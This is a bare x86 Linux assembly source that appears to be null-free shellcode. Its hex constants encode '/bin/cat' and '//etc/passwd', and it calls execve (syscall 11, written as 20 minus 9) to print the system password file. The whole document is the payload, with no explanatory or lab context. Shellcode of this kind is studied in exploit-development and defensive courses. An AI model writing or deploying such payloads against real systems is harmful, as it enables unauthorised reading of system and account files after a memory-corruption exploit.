section .text

global _start

_start:
	xor eax,eax
	cdq
	push edx
	mov dword[esp-4], 0x7461632f
	sub esp,4
	push 0x6e69622f	
	mov ebx,esp
	
	push edx
	mov dword[esp-4], 0x64777373
	sub esp,4	
	push 0x61702f63
	push 0x74652f2f
	mov ecx,esp

	push edx
	push ecx
	mov dword[esp-4],ebx
	sub esp,4
	mov ecx,esp
	mov al,20
	sub al,9
	int 80h
